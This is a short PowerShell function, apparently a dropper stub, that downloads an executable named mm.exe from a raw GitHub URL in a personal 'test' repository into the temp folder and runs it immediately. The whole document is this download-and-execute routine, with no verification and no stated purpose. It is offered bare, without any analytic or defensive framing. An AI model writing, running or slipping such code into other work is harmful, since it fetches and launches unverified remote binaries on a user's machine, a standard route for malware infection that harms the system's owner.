function DFile
{
$link = 'https://raw.githubusercontent.com/CliveHunter/test/master/mm.exe'
 $outfile = "$env:temp\mm.exe"
 Invoke-WebRequest -Uri $link -OutFile $outfile
 Invoke-Item -Path $outfile
}